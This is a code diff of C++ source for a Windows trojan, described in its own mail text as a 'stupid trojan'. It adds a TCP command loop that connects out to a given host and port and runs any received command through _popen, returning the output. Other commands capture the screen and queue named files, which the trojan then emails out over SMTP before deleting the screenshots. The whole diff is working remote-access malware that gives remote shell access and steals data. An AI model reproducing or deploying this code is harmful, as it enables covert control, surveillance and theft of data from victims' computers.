@@ -1,5 +1,7 @@
 #include "util.h"
-void sendemail()
+#include <minwinbase.h>
+
+void sendemail(list<string> l)
 {
 	bool bError = false;
 
@@ -26,25 +28,34 @@ void sendemail()
 		mail.DelMsgLine(2);
 		mail.AddMsgLine("stupid trojan");
 
-		char   buffer[MAX_PATH];
-		getcwd(buffer, MAX_PATH);
-		//mail.AddAttachment("../test1.jpg");
-		strcat(buffer, "\\log");
-		mail.AddAttachment(buffer);
+		if(l.empty())
+		{
+			char   buffer[MAX_PATH];
+			getcwd(buffer, MAX_PATH);
+			strcat(buffer, "\\log");
+			mail.AddAttachment(buffer);
+		}
+		else
+		{
+			for (auto it = l.begin(); it != l.end(); ++it)
+			{
+				mail.AddAttachment((*it).c_str());
+			}
+		}
 		try
 		{
 			mail.Send();
 		}
-		catch(...){}
+		catch(...)
+		{
+			cout << "err" << endl;
+		}
 
 	}
 	catch (ECSmtp e)
 	{
-		//std::cout << "Error: " << e.GetErrorText().c_str() << ".\n";
 		bError = true;
 	}
-	//if (!bError)
-		//std::cout << "Mail was send successfully.\n";
 }
 
 void getHistory()
@@ -81,7 +92,6 @@ void getHistory()
 	}
 	outfile.close();
 }
-
 
 void copy()
 {
@@ -190,4 +200,131 @@ cleanup:
 	ReleaseDC(NULL, hdcScreen);
 	ReleaseDC(hWnd, hdcWindow);
 	return result;
+}
+
+void tcpconnect(char *addr,char*  port)
+{
+	int pn(0);
+	list<string> l;
+	const int buflen = 512;
+	WSADATA wsaData;
+	SOCKET connect_socket = INVALID_SOCKET;
+	struct addrinfo *result = NULL,
+		*ptr = NULL,
+		hints;
+	char recvbuf[buflen];
+	
+	//Initialize winsock
+	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
+	if(iResult!=0)
+		return;
+	ZeroMemory(&hints, sizeof(hints));
+	hints.ai_family = AF_UNSPEC;
+	hints.ai_socktype = SOCK_STREAM;
+	hints.ai_protocol = IPPROTO_TCP;
+
+	// Resolve the server address and port
+	iResult = getaddrinfo(addr, port, &hints, &result);
+	if (iResult != 0) 
+	{
+		WSACleanup();
+		return;
+	}
+
+	// Attempt to connect to an address until one succeeds
+	for (ptr = result; ptr != NULL; ptr = ptr->ai_next) 
+	{
+		// Create a SOCKET for connecting to server
+		connect_socket = socket(ptr->ai_family, ptr->ai_socktype,
+			ptr->ai_protocol);
+		if (connect_socket == INVALID_SOCKET) {
+			WSACleanup();
+			return;
+		}
+		// Connect to server.
+		iResult = connect(connect_socket, ptr->ai_addr, (int)ptr->ai_addrlen);
+		if (iResult == SOCKET_ERROR) {
+			closesocket(connect_socket);
+			connect_socket = INVALID_SOCKET;
+			continue;
+		}
+		break;
+	}
+
+	freeaddrinfo(result);
+	if (connect_socket == INVALID_SOCKET) {
+		WSACleanup();
+		return;
+	}
+
+	// Send an initial buffer
+	send(connect_socket, "successfully connect",buflen, 0);
+
+	// Receive until the peer closes the connection
+
+	
+	do {
+		recv(connect_socket, recvbuf, buflen, 0);
+		string a1("");
+		string a2("");
+		bool t(false);
+		for(int i=0;recvbuf[i]!='\0';++i)
+		{
+			if(recvbuf[i]==' ' && !t)
+			{
+				t = true;
+				continue;
+			}
+			if(!t)
+			{
+				a1 += recvbuf[i];
+			}
+			else
+			{
+				a2 += recvbuf[i];
+			}
+		}
+
+		if(a1=="email")
+		{
+			sendemail(l);
+			_popen("del *.jpg", "w");
+			send(connect_socket, "end", buflen, 0);
+		}
+		else if(a1=="screenfetch")
+		{
+			string s = to_string(pn);
+			s += ".jpg";
+			ScreenCapture(s.c_str());
+			char   path[MAX_PATH];
+			getcwd(path, MAX_PATH);
+			strcat(path, "\\");
+			strcat(path, s.c_str());
+			l.push_back(path);
+			++pn;
+			send(connect_socket, "end", buflen, 0);
+		}
+		else if (a1 == "get")
+		{
+			l.push_back(a2);
+			send(connect_socket, "end", buflen, 0);
+		}
+		else
+		{
+			FILE * fp;
+			char buffer[buflen];
+			fp = _popen(recvbuf, "r");
+			while (fgets(buffer, buflen, fp))
+			{
+				int j= strlen(buffer);
+				send(connect_socket, buffer, buflen, 0);
+			}
+			send(connect_socket, "end", buflen, 0);
+			_pclose(fp);
+		}
+	} while (true);
+
+	// cleanup
+	closesocket(connect_socket);
+	WSACleanup();
 }
